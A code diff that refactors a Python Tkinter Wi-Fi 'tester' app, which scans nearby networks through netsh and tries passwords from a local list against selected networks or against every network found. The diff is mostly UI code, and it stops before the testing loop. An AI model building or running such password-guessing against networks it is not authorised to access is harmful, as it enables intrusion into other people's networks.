-            net_actions, "Test All Networks",
-            command=self.start_auto_testing,
-            icon="🚀", bg=DesignTokens.ACCENT_PRIMARY,
-            width=150, height=40, radius=8, font_size=11
+            ab, "Test All Networks", command=self._test_auto,
+            icon="🚀", bg=C["orange"], width=150, height=38, radius=7, font_size=10
         )
         self.auto_btn.pack(side=tk.LEFT, padx=(0, 8))
 
         self.stop_btn = ModernButton(
-            net_actions, "Stop",
-            command=self.stop_testing,
-            icon="⏹", bg=DesignTokens.ACCENT_DANGER,
-            width=90, height=40, radius=8, font_size=11
+            ab, "Stop", command=self._stop,
+            icon="⏹", bg=C["danger"], width=80, height=38, radius=7, font_size=10
         )
         self.stop_btn.pack(side=tk.LEFT)
 
-        # Right column - Password DB + Logs
-        right_col = tk.Frame(main_scroll, bg=DesignTokens.BG_APP)
-        right_col.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        # RIGHT: Passwords + Log
+        right = tk.Frame(body, bg=C["bg"])
+        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
 
-        pass_card = GlassCard(right_col, padding=0)
-        pass_card.pack(fill=tk.BOTH, expand=True, pady=(0, 12))
+        # Password card
+        pc = tk.Frame(right, bg=C["card"], highlightbackground=C["border"],
+                     highlightthickness=1)
+        pc.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
 
-        pass_header = tk.Frame(pass_card, bg=DesignTokens.BG_CARD)
-        pass_header.pack(fill=tk.X, padx=16, pady=(16, 12))
+        pch = tk.Frame(pc, bg=C["card"])
+        pch.pack(fill=tk.X, padx=16, pady=(16, 10))
+        tk.Label(pch, text="Password Database", font=(C["font"], 13, "bold"),
+                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)
 
-        tk.Label(pass_header, text="Password Database",
-                font=(DesignTokens.FONT_FAMILY, 13, "bold"),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_CARD).pack(side=tk.LEFT)
+        plc = tk.Frame(pc, bg=C["card"])
+        plc.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 8))
 
-        pass_list_container = tk.Frame(pass_card, bg=DesignTokens.BG_CARD)
-        pass_list_container.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 8))
-
-        self.password_listbox = tk.Listbox(
-            pass_list_container,
-            bg=DesignTokens.BG_INPUT, fg=DesignTokens.TEXT_PRIMARY,
-            selectbackground=DesignTokens.ACCENT_PRIMARY,
-            selectforeground="#ffffff",
-            font=(DesignTokens.FONT_MONO, 9),
-            borderwidth=0, highlightthickness=1,
-            highlightbackground=DesignTokens.BORDER,
-            highlightcolor=DesignTokens.BORDER_FOCUS,
+        self.plist = tk.Listbox(
+            plc, bg=C["input"], fg=C["text"],
+            selectbackground=C["orange"], selectforeground="#ffffff",
+            font=(C["mono"], 9), borderwidth=0, highlightthickness=1,
+            highlightbackground=C["border"], highlightcolor=C["border_focus"],
             activestyle="none"
         )
-        self.password_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        self.plist.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
 
-        pass_scroll = ttk.Scrollbar(pass_list_container, orient="vertical",
-                                   command=self.password_listbox.yview)
-        self.password_listbox.configure(yscrollcommand=pass_scroll.set)
-        pass_scroll.pack(side=tk.RIGHT, fill=tk.Y)
+        psb = ttk.Scrollbar(plc, orient="vertical", command=self.plist.yview)
+        self.plist.configure(yscrollcommand=psb.set)
+        psb.pack(side=tk.RIGHT, fill=tk.Y)
 
-        self.refresh_password_list()
+        self._refresh_plist()
 
-        input_frame = tk.Frame(pass_card, bg=DesignTokens.BG_CARD)
-        input_frame.pack(fill=tk.X, padx=16, pady=(0, 16))
+        # Password input row
+        pi = tk.Frame(pc, bg=C["card"])
+        pi.pack(fill=tk.X, padx=16, pady=(0, 16))
 
-        self.new_pass_entry = tk.Entry(
-            input_frame,
-            bg=DesignTokens.BG_INPUT, fg=DesignTokens.TEXT_PRIMARY,
-            insertbackground=DesignTokens.ACCENT_PRIMARY,
+        self.new_pass = tk.Entry(
+            pi, bg=C["input"], fg=C["text"], insertbackground=C["orange"],
             borderwidth=0, highlightthickness=1,
-            highlightbackground=DesignTokens.BORDER,
-            highlightcolor=DesignTokens.BORDER_FOCUS,
-            font=(DesignTokens.FONT_FAMILY, 10)
+            highlightbackground=C["border"], highlightcolor=C["border_focus"],
+            font=(C["font"], 10)
         )
-        self.new_pass_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
-        self.new_pass_entry.bind("<Return>", lambda e: self.add_password())
+        self.new_pass.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
+        self.new_pass.bind("<Return>", lambda e: self._add_pass())
 
-        add_btn = ModernButton(
-            input_frame, "Add", command=self.add_password,
-            icon="➕", bg=DesignTokens.ACCENT_PRIMARY,
-            width=70, height=32, radius=6, font_size=10
-        )
-        add_btn.pack(side=tk.RIGHT)
+        ModernButton(
+            pi, "Add", command=self._add_pass, icon="➕",
+            bg=C["orange"], width=70, height=32, radius=6, font_size=10
+        ).pack(side=tk.RIGHT)
+
+        # Remove/Clear row
+        pr = tk.Frame(pc, bg=C["card"])
+        pr.pack(fill=tk.X, padx=16, pady=(0, 16))
+
+        ModernButton(
+            pr, "Remove", command=self._remove_pass, icon="➖",
+            bg=C["danger"], width=90, height=32, radius=6, font_size=10
+        ).pack(side=tk.LEFT, padx=(0, 8))
+
+        ModernButton(
+            pr, "Clear All", command=self._clear_pass, icon="🗑",
+            bg=C["danger"], width=100, height=32, radius=6, font_size=10
+        ).pack(side=tk.LEFT)
 
         # Log card
-        log_card = GlassCard(right_col, padding=0)
-        log_card.pack(fill=tk.BOTH, expand=True)
+        lc2 = tk.Frame(right, bg=C["card"], highlightbackground=C["border"],
+                      highlightthickness=1)
+        lc2.pack(fill=tk.BOTH, expand=True)
 
-        log_header = tk.Frame(log_card, bg=DesignTokens.BG_CARD)
-        log_header.pack(fill=tk.X, padx=16, pady=(16, 12))
-
-        tk.Label(log_header, text="Activity Log",
-                font=(DesignTokens.FONT_FAMILY, 13, "bold"),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_CARD).pack(side=tk.LEFT)
+        lch = tk.Frame(lc2, bg=C["card"])
+        lch.pack(fill=tk.X, padx=16, pady=(16, 10))
+        tk.Label(lch, text="Activity Log", font=(C["font"], 13, "bold"),
+                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)
 
         self.log_text = tk.Text(
-            log_card, height=10,
-            bg=DesignTokens.BG_INPUT, fg=DesignTokens.TEXT_SECONDARY,
-            font=(DesignTokens.FONT_MONO, 8),
-            borderwidth=0, highlightthickness=1,
-            highlightbackground=DesignTokens.BORDER,
-            highlightcolor=DesignTokens.BORDER_FOCUS,
-            insertbackground=DesignTokens.ACCENT_PRIMARY,
-            state=tk.DISABLED, wrap=tk.WORD
+            lc2, height=10, bg=C["input"], fg=C["text_second"],
+            font=(C["mono"], 8), borderwidth=0, highlightthickness=1,
+            highlightbackground=C["border"], highlightcolor=C["border_focus"],
+            insertbackground=C["orange"], state=tk.DISABLED, wrap=tk.WORD
         )
         self.log_text.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 16))
 
-        self.log_text.tag_config("info", foreground=DesignTokens.TEXT_SECONDARY)
-        self.log_text.tag_config("success", foreground=DesignTokens.ACCENT_SUCCESS)
-        self.log_text.tag_config("error", foreground=DesignTokens.ACCENT_DANGER)
-        self.log_text.tag_config("warning", foreground=DesignTokens.ACCENT_WARNING)
-        self.log_text.tag_config("timestamp", foreground=DesignTokens.TEXT_MUTED)
+        self.log_text.tag_config("ts", foreground=C["text_muted"])
+        self.log_text.tag_config("info", foreground=C["text_second"])
+        self.log_text.tag_config("success", foreground=C["success"])
+        self.log_text.tag_config("error", foreground=C["danger"])
+        self.log_text.tag_config("warning", foreground=C["warning"])
 
         # Status bar
-        status_bar = tk.Frame(content, bg=DesignTokens.BG_SECONDARY, height=32)
-        status_bar.pack(fill=tk.X, padx=20, pady=(0, 16))
-        status_bar.pack_propagate(False)
+        sb = tk.Frame(content, bg=C["card"], height=32)
+        sb.pack(fill=tk.X, padx=20, pady=(0, 16))
+        sb.pack_propagate(False)
 
         self.status_var = tk.StringVar(value="Ready")
-        tk.Label(status_bar, textvariable=self.status_var,
-                font=(DesignTokens.FONT_FAMILY, 9),
-                fg=DesignTokens.TEXT_SECONDARY, bg=DesignTokens.BG_SECONDARY,
-                anchor="w").pack(side=tk.LEFT, padx=12, anchor="center")
+        tk.Label(sb, textvariable=self.status_var, font=(C["font"], 9),
+                fg=C["text_second"], bg=C["card"], anchor="w").pack(
+                side=tk.LEFT, padx=12, anchor="center")
 
-        self.pulse_indicator = PulseRing(status_bar, DesignTokens.ACCENT_PRIMARY, size=16)
-        self.pulse_indicator.pack(side=tk.RIGHT, padx=12)
+        self.pulse = PulseRing(sb, C["orange"], size=16)
+        self.pulse.pack(side=tk.RIGHT, padx=12)
 
-        self.log("Aymo WiFi Tester v5 initialized", "info")
+        self._log("Aymo WiFi Tester v5.1 initialized", "info")
         if not self.is_admin:
-            self.log("Standard user - basic scanning works without Admin", "warning")
-            self.log("Run as administrator for password testing", "info")
+            self._log("Standard user - scanning works, testing needs Admin", "warning")
+            self._log("Right-click → Run as administrator", "info")
 
     # ------------------------------------------------------------------
-    # UI Components helpers
+    # Nav item
     # ------------------------------------------------------------------
-    def _create_nav_item(self, parent, icon, label, key):
-        frame = tk.Frame(parent, bg=DesignTokens.BG_SIDEBAR, cursor="hand2")
+    def _nav_item(self, parent, icon, label, key):
+        f = tk.Frame(parent, bg=C["card"], cursor="hand2")
+        ic = tk.Label(f, text=icon, font=(C["font"], 13),
+                     fg=C["text_muted"], bg=C["card"])
+        ic.pack(side=tk.LEFT, padx=(16, 10))
+        lb = tk.Label(f, text=label, font=(C["font"], 10, "bold"),
+                     fg=C["text_muted"], bg=C["card"], anchor="w")
+        lb.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 16))
 
-        icon_label = tk.Label(frame, text=icon,
-                             font=(DesignTokens.FONT_FAMILY, 14),
-                             fg=DesignTokens.TEXT_MUTED, bg=DesignTokens.BG_SIDEBAR)
-        icon_label.pack(side=tk.LEFT, padx=(16, 10))
+        def ent(e):
+            if key != self._nav_active:
+                f.configure(bg=C["card_hover"])
+                ic.configure(bg=C["card_hover"])
+                lb.configure(bg=C["card_hover"], fg=C["text"])
 
-        text_label = tk.Label(frame, text=label,
-                             font=(DesignTokens.FONT_FAMILY, 10, "bold"),
-                             fg=DesignTokens.TEXT_MUTED, bg=DesignTokens.BG_SIDEBAR,
-                             anchor="w")
-        text_label.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 16))
+        def lev(e):
+            if key != self._nav_active:
+                f.configure(bg=C["card"])
+                ic.configure(bg=C["card"])
+                lb.configure(bg=C["card"], fg=C["text_muted"])
 
-        def on_enter(e):
-            if key != self._active_nav:
-                frame.configure(bg=DesignTokens.BG_ACTIVE)
-                icon_label.configure(bg=DesignTokens.BG_ACTIVE)
-                text_label.configure(bg=DesignTokens.BG_ACTIVE, fg=DesignTokens.TEXT_PRIMARY)
+        def cl(e):
+            self._nav_active = key
+            for k, bf in self.nav_btns.items():
+                act = k == key
+                bgc = C["card_hover"] if act else C["card"]
+                fgc = C["text"] if act else C["text_muted"]
+                bf.configure(bg=bgc)
+                for ch in bf.winfo_children():
+                    ch.configure(bg=bgc, fg=fgc)
 
-        def on_leave(e):
-            if key != self._active_nav:
-                frame.configure(bg=DesignTokens.BG_SIDEBAR)
-                icon_label.configure(bg=DesignTokens.BG_SIDEBAR, fg=DesignTokens.TEXT_MUTED)
-                text_label.configure(bg=DesignTokens.BG_SIDEBAR, fg=DesignTokens.TEXT_MUTED)
+        f.bind("<Enter>", ent); f.bind("<Leave>", lev); f.bind("<Button-1>", cl)
+        ic.bind("<Enter>", ent); ic.bind("<Leave>", lev); ic.bind("<Button-1>", cl)
+        lb.bind("<Enter>", ent); lb.bind("<Leave>", lev); lb.bind("<Button-1>", cl)
+        return f
 
-        def on_click(e):
-            self._set_active_nav(key)
+    _nav_active = "scan"
 
-        frame.bind("<Enter>", on_enter)
-        frame.bind("<Leave>", on_leave)
-        frame.bind("<Button-1>", on_click)
-        icon_label.bind("<Enter>", on_enter)
-        icon_label.bind("<Leave>", on_leave)
-        icon_label.bind("<Button-1>", on_click)
-        text_label.bind("<Enter>", on_enter)
-        text_label.bind("<Leave>", on_leave)
-        text_label.bind("<Button-1>", on_click)
-
-        return frame
-
-    _active_nav = "scan"
-
-    def _set_active_nav(self, key):
-        self._active_nav = key
-        for k, btn_frame in self.nav_buttons.items():
-            is_active = k == key
-            bg = DesignTokens.BG_ACTIVE if is_active else DesignTokens.BG_SIDEBAR
-            fg = DesignTokens.TEXT_PRIMARY if is_active else DesignTokens.TEXT_MUTED
-            btn_frame.configure(bg=bg)
-            for child in btn_frame.winfo_children():
-                child.configure(bg=bg, fg=fg)
-
-    def _status_badge(self, parent, text, color):
-        badge = tk.Canvas(parent, width=100, height=24,
-                         highlightthickness=0, bg=DesignTokens.BG_APP)
-        badge.text = text
-        badge.color = color
+    def _pill(self, parent, text, color):
+        p = tk.Canvas(parent, width=100, height=24, highlightthickness=0, bg=C["bg"])
+        p.text = text; p.color = color
 
         def draw():
-            badge.delete("all")
-            w = badge.winfo_width() or 100
-            h = badge.winfo_height() or 24
+            p.delete("all")
+            w = p.winfo_width() or 100
+            h = p.winfo_height() or 24
             r = h // 2
-            badge.create_oval(0, 0, h, h, fill=color, outline="")
-            badge.create_oval(w - h, 0, w, h, fill=color, outline="")
-            badge.create_rectangle(r, 0, w - r, h, fill=color, outline="")
-            badge.create_text(w // 2, h // 2, text=text, fill="#ffffff",
-                             font=(DesignTokens.FONT_FAMILY, 8, "bold"), anchor=tk.CENTER)
+            p.create_oval(0, 0, h, h, fill=color, outline="")
+            p.create_oval(w - h, 0, w, h, fill=color, outline="")
+            p.create_rectangle(r, 0, w - r, h, fill=color, outline="")
+            p.create_text(w // 2, h // 2, text=text, fill="#ffffff",
+                         font=(C["font"], 8, "bold"), anchor=tk.CENTER)
 
-        badge.bind("<Configure>", lambda e: draw())
+        p.bind("<Configure>", lambda e: draw())
         draw()
-        return badge
+        return p
 
-    def _draw_wifi_logo(self, canvas, color):
+    def _draw_wifi(self, canvas, color):
         canvas.delete("all")
-        cx, cy = 20, 20
-        for i, r in enumerate([7, 12, 17]):
+        cx, cy = 18, 18
+        for i, r in enumerate([6, 11, 16]):
             y = cy + (i - 1) * 3
             canvas.create_arc(cx - r, y - r, cx + r, y + r,
-                             start=220, extent=100,
-                             outline=color, width=2.5, style=tk.ARC)
-        canvas.create_oval(cx - 2.5, cy + 1.5, cx + 2.5, cy + 5, fill=color, outline="")
+                             start=220, extent=100, outline=color, width=2, style=tk.ARC)
+        canvas.create_oval(cx - 2, cy + 1.5, cx + 2, cy + 4.5, fill=color, outline="")
 
     # ------------------------------------------------------------------
     # Password DB
     # ------------------------------------------------------------------
-    def load_sample_passwords(self):
-        """Seed the password database with the bundled sample list on first run."""
-        sample_path = Path(__file__).parent / "sample_passwords.json"
-        if sample_path.exists():
-            try:
-                with open(sample_path, 'r', encoding='utf-8') as f:
-                    samples = json.load(f)
-                if isinstance(samples, dict):
-                    samples = samples.get("passwords", [])
-                for pwd in samples:
-                    if isinstance(pwd, str) and pwd not in self.password_db:
-                        self.password_db.append(pwd)
-                self.save_password_db()
-                self.refresh_password_list()
-                self.log(f"Loaded {len(samples)} sample passwords", "info")
-                return
-            except Exception as e:
-                self.log(f"Could not load sample passwords: {e}", "warning")
-        self.log("No sample password file found - add passwords manually", "warning")
-
-    def load_password_db(self):
+    def _load_db(self):
         if self.db_path.exists():
             try:
-                with open(self.db_path, 'r') as f:
+                with open(self.db_path, "r") as f:
                     return json.load(f)
             except:
                 pass
         return []
 
-    def save_password_db(self):
+    def _save_db(self):
         try:
-            with open(self.db_path, 'w') as f:
+            with open(self.db_path, "w") as f:
                 json.dump(self.password_db, f, indent=2)
         except Exception as e:
-            self.log(f"Error saving DB: {e}", "error")
+            self._log(f"DB save error: {e}", "error")
 
-    def refresh_password_list(self):
-        if not self.password_listbox:
+    def _refresh_plist(self):
+        if not self.plist:
             return
-        self.password_listbox.delete(0, tk.END)
-        for pwd in self.password_db:
-            self.password_listbox.insert(tk.END, pwd)
+        self.plist.delete(0, tk.END)
+        for p in self.password_db:
+            self.plist.insert(tk.END, p)
 
-    def add_password(self):
-        pwd = self.new_pass_entry.get().strip()
-        if pwd and pwd not in self.password_db:
-            self.password_db.append(pwd)
-            self.save_password_db()
-            self.refresh_password_list()
-            self.new_pass_entry.delete(0, tk.END)
-            self.log(f"Added password ({len(self.password_db)} total)", "success")
-        elif pwd in self.password_db:
-            self.log("Password already exists", "warning")
+    def _add_pass(self):
+        p = self.new_pass.get().strip()
+        if p and p not in self.password_db:
+            self.password_db.append(p)
+            self._save_db()
+            self._refresh_plist()
+            self.new_pass.delete(0, tk.END)
+            self._log(f"Added password ({len(self.password_db)} total)", "success")
+        elif p in self.password_db:
+            self._log("Password already exists", "warning")
+
+    def _remove_pass(self):
+        sel = self.plist.curselection()
+        if sel:
+            idx = sel[0]
+            p = self.plist.get(idx)
+            self.password_db.remove(p)
+            self._save_db()
+            self._refresh_plist()
+            self._log("Removed password", "info")
+
+    def _clear_pass(self):
+        if self.password_db and messagebox.askyesno("Confirm", "Clear all passwords?"):
+            self.password_db.clear()
+            self._save_db()
+            self._refresh_plist()
+            self._log("Cleared all passwords", "warning")
+
+    def _load_sample(self):
+        sp = Path(__file__).parent / "sample_passwords.json"
+        if sp.exists():
+            try:
+                with open(sp, "r") as f:
+                    self.password_db = json.load(f)
+                self._save_db()
+                self._refresh_plist()
+                self._log(f"Loaded {len(self.password_db)} sample passwords", "success")
+            except Exception as e:
+                self._log(f"Sample load error: {e}", "error")
 
     # ------------------------------------------------------------------
-    # Network selection
+    # Netsh
     # ------------------------------------------------------------------
-    def toggle_select_all(self):
-        select = self.select_all_var.get()
-        self.selected_networks = set()
-        for item in self.network_tree.get_children():
-            vals = self.network_tree.item(item)['values']
-            if vals:
-                ssid = vals[1]
-                if select:
-                    self.selected_networks.add(ssid)
-                self.network_tree.item(item, tags=("selected" if select else ""))
-        self.network_tree.tag_configure("selected", background=DesignTokens.ACCENT_PRIMARY)
-        self.status_var.set(f"{len(self.selected_networks)} network(s) selected")
+    def _netsh(self, args):
+        try:
+            r = subprocess.run(["netsh", "wlan"] + args, capture_output=True,
+                              timeout=20, creationflags=CREATE_NO_WINDOW)
+            out = err = ""
+            if r.stdout:
+                for enc in ("utf-8", "cp850", "cp437", "cp1252", "latin-1"):
+                    try:
+                        out = r.stdout.decode(enc); break
+                    except: continue
+                else:
+                    out = r.stdout.decode("utf-8", errors="replace")
+            if r.stderr:
+                for enc in ("utf-8", "cp850", "cp437", "cp1252", "latin-1"):
+                    try:
+                        err = r.stderr.decode(enc); break
+                    except: continue
+                else:
+                    err = r.stderr.decode("utf-8", errors="replace")
+            return r.returncode == 0, out, err
+        except subprocess.TimeoutExpired:
+            return False, "", "Timeout"
+        except Exception as e:
+            return False, "", str(e)
 
-    def on_tree_click(self, event):
-        # Handle checkbox column click
-        region = self.network_tree.identify_region(event.x, event.y)
+    # ------------------------------------------------------------------
+    # Scan
+    # ------------------------------------------------------------------
+    def _scan(self):
+        if self.scanning:
+            return
+        self.scanning = True
+        self.scan_btn.set_enabled(False)
+        self.pulse.start()
+        self.status_var.set("Scanning...")
+        self._log("Scanning networks...", "info")
+
+        def run():
+            ok, out, err = self._netsh(["show", "networks"])
+            if not ok or not out.strip():
+                self.root.after(0, lambda: self._log("Trying detailed scan...", "info"))
+                ok2, out2, err2 = self._netsh(["show", "networks", "mode=bssid"])
+                if ok2 and out2.strip():
+                    ok, out, err = ok2, out2, err2
+            if not ok or not out.strip():
+                if not self.is_admin:
+                    err = (err or "Access denied") + "\nRun as administrator for full access"
+                self.root.after(0, lambda: self._result(ok, out, err))
+                return
+            self.root.after(0, lambda: self._result(ok, out, err))
+
+        threading.Thread(target=run, daemon=True).start()
+
+    def _result(self, ok, out, err):
+        self.scanning = False
+        self.scan_btn.set_enabled(True)
+        self.pulse.stop()
+        self.status_var.set("Ready")
+
+        if self.tree:
+            self.tree.delete(*self.tree.get_children())
+            self.network_items = {}
+            self.selected_networks = set()
+
+        if not ok:
+            self._log(f"Scan failed: {err}", "error")
+            if out.strip():
+                self._log(f"Raw: {out[:200]}...", "info")
+            return
+
+        if not out.strip():
+            self._log("Empty output. Enable WiFi and run as Admin.", "warning")
+            self.status_var.set("No networks found")
+            return
+
+        nets = self._parse(out)
+        if not nets:
+            self._log("Could not parse output", "warning")
+            self._log(out[:500], "info")
+            self.status_var.set("No networks found")
+            return
+
+        for n in nets:
+            s = n["signal"]
+            bar = "██████" if s >= 80 else "████░░" if s >= 60 else "███░░░" if s >= 40 else "██░░░░" if s >= 20 else "█░░░░░"
+            item = self.tree.insert("", tk.END, values=(
+                "", n["ssid"], f"{bar} {s}%", n["auth"], "Ready"
+            ))
+            self.network_items[n["ssid"]] = item
+
+        self._log(f"Found {len(nets)} networks", "success")
+        self.status_var.set(f"{len(nets)} networks")
+
+    def _parse(self, out):
+        nets = []
+        cur = {"ssid": None, "auth": None, "sig": 0}
+        for line in out.split("\n"):
+            line = line.strip()
+            if line.startswith("SSID"):
+                if cur["ssid"]:
+                    nets.append(cur)
+                    cur = {"ssid": None, "auth": None, "sig": 0}
+                if ":" in line:
+                    p = line.split(":", 1)
+                    cur["ssid"] = p[1].strip() if len(p) > 1 and p[1].strip() else None
+            elif line.startswith("Authentication"):
+                if ":" in line:
+                    cur["auth"] = line.split(":", 1)[1].strip()
+            elif line.startswith("Signal"):
+                if ":" in line:
+                    try:
+                        cur["sig"] = int(line.split(":", 1)[1].strip().replace("%", ""))
+                    except:
+                        cur["sig"] = 0
+        if cur["ssid"]:
+            nets.append(cur)
+        nets.sort(key=lambda x: x["sig"], reverse=True)
+        return nets
+
+    def _on_tree_click(self, e):
+        region = self.tree.identify_region(e.x, e.y)
         if region == "cell":
-            column = self.network_tree.identify_column(event.x)
-            if column == "#1":  # select column
-                item = self.network_tree.identify_row(event.y)
+            col = self.tree.identify_column(e.x)
+            if col == "#1":
+                item = self.tree.identify_row(e.y)
                 if item:
-                    vals = self.network_tree.item(item)['values']
+                    vals = self.tree.item(item)["values"]
                     if vals:
                         ssid = vals[1]
-                        tags = self.network_tree.item(item).get('tags', ())
-                        if "selected" in tags:
+                        tags = self.tree.item(item).get("tags", ())
+                        if "sel" in tags:
                             self.selected_networks.discard(ssid)
-                            self.network_tree.item(item, tags=())
+                            self.tree.item(item, tags=())
                         else:
                             self.selected_networks.add(ssid)
-                            self.network_tree.item(item, tags=("selected",))
-                        self.network_tree.tag_configure("selected",
-                                                       background=DesignTokens.ACCENT_PRIMARY)
-                        self.status_var.set(f"{len(self.selected_networks)} network(s) selected")
-                return
+                            self.tree.item(item, tags=("sel",))
+                        self.status_var.set(f"{len(self.selected_networks)} selected")
 
-    def on_network_select(self, event):
-        selection = self.network_tree.selection()
-        if selection:
-            item = self.network_tree.item(selection[0])
-            vals = item['values']
+    def _on_select(self, e):
+        sel = self.tree.selection()
+        if sel:
+            vals = self.tree.item(sel[0])["values"]
             if vals:
                 self.current_network = vals[1]
                 self.status_var.set(f"Selected: {self.current_network}")
 
     # ------------------------------------------------------------------
-    # Network Scanning
+    # Test single
     # ------------------------------------------------------------------
-    def run_netsh(self, args):
-        try:
-            cmd = ["netsh", "wlan"] + args
-            result = subprocess.run(cmd, capture_output=True, timeout=20,
-                                   creationflags=CREATE_NO_WINDOW)
-
-            stdout = ""
-            stderr = ""
-            if result.stdout:
-                for enc in ("utf-8", "cp850", "cp437", "cp1252", "latin-1"):
-                    try:
-                        stdout = result.stdout.decode(enc)
-                        break
-                    except (UnicodeDecodeError, LookupError):
-                        continue
-                else:
-                    stdout = result.stdout.decode("utf-8", errors="replace")
-
-            if result.stderr:
-                for enc in ("utf-8", "cp850", "cp437", "cp1252", "latin-1"):
-                    try:
-                        stderr = result.stderr.decode(enc)
-                        break
-                    except (UnicodeDecodeError, LookupError):
-                        continue
-                else:
-                    stderr = result.stderr.decode("utf-8", errors="replace")
-
-            return result.returncode == 0, stdout, stderr
-        except subprocess.TimeoutExpired:
-            return False, "", "Command timed out"
-        except Exception as e:
-            return False, "", str(e)
-
-    def refresh_networks(self):
-        if self.scanning:
-            return
-
-        self.scanning = True
-        self.refresh_modern_btn.set_enabled(False)
-        self.pulse_indicator.start()
-        self.status_var.set("Scanning networks...")
-        self.log("Scanning for available networks...", "info")
-
-        def scan():
-            success, output, error = self.run_netsh(["show", "networks"])
-
-            if not success or not output.strip():
-                self.root.after(0, lambda: self.log("Trying detailed scan...", "info"))
-                success2, output2, error2 = self.run_netsh(["show", "networks", "mode=bssid"])
-                if success2 and output2.strip():
-                    success, output, error = success2, output2, error2
-
-            if not success or not output.strip():
-                if not self.is_admin:
-                    error = (error or "Access denied") + "\n\nTip: Run as administrator for full access"
-                self.root.after(0, lambda: self.process_network_list(success, output, error))
-                return
-
-            self.root.after(0, lambda: self.process_network_list(success, output, error))
-
-        threading.Thread(target=scan, daemon=True).start()
-
-    def process_network_list(self, success, output, error):
-        self.scanning = False
-        self.refresh_modern_btn.set_enabled(True)
-        self.pulse_indicator.stop()
-        self.status_var.set("Ready")
-
-        if self.network_tree:
-            self.network_tree.delete(*self.network_tree.get_children())
-            self.network_items = {}
-            self.selected_networks = set()
-            self.select_all_var.set(False)
-
-        if not success:
-            self.log(f"Scan failed: {error}", "error")
-            self.toast("Scan failed - check logs", "error")
-            if output.strip():
-                self.log(f"Raw: {output[:200]}...", "info")
-            return
-
-        if not output.strip():
-            self.log("Empty output from netsh", "warning")
-            self.log("Ensure WiFi is enabled and you're running as Administrator", "info")
-            self.status_var.set("No networks found")
-            return
-
-        networks = self.parse_network_output(output)
-
-        if not networks:
-            self.log("Could not parse netsh output", "warning")
-            self.log(output[:500], "info")
-            self.status_var.set("No networks found")
-            return
-
-        for net in networks:
-            signal = net['signal']
-            if signal >= 80:
-                signal_display = "██████ " + f"{signal}%"
-            elif signal >= 60:
-                signal_display = "████░░ " + f"{signal}%"
-            elif signal >= 40:
-                signal_display = "███░░░ " + f"{signal}%"
-            elif signal >= 20:
-                signal_display = "██░░░░ " + f"{signal}%"
-            else:
-                signal_display = "█░░░░░ " + f"{signal}%"
-
-            item = self.network_tree.insert("", tk.END, values=(
-                "", net['ssid'], signal_display, net['auth'], "Ready"
-            ))
-            self.network_items[net['ssid']] = item
-
-        self.log(f"Found {len(networks)} networks", "success")
-        self.toast(f"Found {len(networks)} network(s)", "success")
-        self.status_var.set(f"{len(networks)} networks available")
-
-    def parse_network_output(self, output):
-        networks = []
-        current_ssid = None
-        current_auth = None
-        current_signal = 0
-
-        for line in output.split('\n'):
-            line = line.strip()
-
-            if line.startswith("SSID"):
-                if current_ssid:
-                    networks.append({
-                        'ssid': current_ssid,
-                        'auth': current_auth or "Unknown",
-                        'signal': current_signal
-                    })
-                if ":" in line:
-                    parts = line.split(":", 1)
-                    current_ssid = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
-                else:
-                    current_ssid = None
-                current_auth = None
-                current_signal = 0
-
-            elif line.startswith("Authentication"):
-                if ":" in line:
-                    parts = line.split(":", 1)
-                    if len(parts) > 1:
-                        current_auth = parts[1].strip()
-
-            elif line.startswith("Signal"):
-                if ":" in line:
-                    parts = line.split(":", 1)
-                    if len(parts) > 1:
-                        try:
-                            current_signal = int(parts[1].strip().replace("%", ""))
-                        except:
-                            current_signal = 0
-
-        if current_ssid:
-            networks.append({
-                'ssid': current_ssid,
-                'auth': current_auth or "Unknown",
-                'signal': current_signal
-            })
-
-        networks.sort(key=lambda x: x['signal'], reverse=True)
-        return networks
-
-    # ------------------------------------------------------------------
-    # Password Testing - Single
-    # ------------------------------------------------------------------
-    def start_testing(self):
+    def _test_single(self):
         if self.testing or self.auto_testing:
             return
-
         target = self.current_network or (next(iter(self.selected_networks)) if self.selected_networks else None)
         if not target:
-            self.toast("Select a network first", "warning")
+            self._toast("Select a network", "warning")
             return
-
         if not self.password_db:
-            self.toast("Add passwords first", "warning")
+            self._toast("Add passwords first", "warning")
             return
-
         if not self.is_admin:
-            result = messagebox.askyesno(
-                "Admin Required",
-                "Password testing requires Administrator privileges.\nContinue anyway?"
-            )
-            if not result:
+            if not messagebox.askyesno("Admin", "Testing needs Admin. Continue?"):
                 return
 
         self.testing = True
         self.test_btn.set_enabled(False)
         self.auto_btn.set_enabled(False)
         self.stop_btn.set_enabled(True)
-        self.refresh_modern_btn.set_enabled(False)
+        self.scan_btn.set_enabled(False)
         self.status_var.set(f"Testing {target}...")
-        self.log(f"Starting password test: {target}", "info")
+        self._log(f"Testing: {target}", "info")
 
-        def test():
-            self.test_passwords(target)
-
-        threading.Thread(target=test, daemon=True).start()
+        def run():
+            self._test_pw(target)
+        threading.Thread(target=run, daemon=True).start()
 
     # ------------------------------------------------------------------
-    # Password Testing - Auto All (FAST)
+    # Test all
     # ------------------------------------------------------------------
-    def start_auto_testing(self):
+    def _test_auto(self):
         if self.testing or self.auto_testing:
             return
-
-        networks_to_test = list(self.selected_networks) if self.selected_networks else \
-            [self.network_tree.item(i)['values'][1] for i in self.network_tree.get_children()]
-
-        if not networks_to_test:
-            self.toast("No networks to test", "warning")
+        nets = list(self.selected_networks) if self.selected_networks else \
+            [self.tree.item(i)["values"][1] for i in self.tree.get_children()]
+        if not nets:
+            self._toast("No networks", "warning")
             return
-
         if not self.password_db:
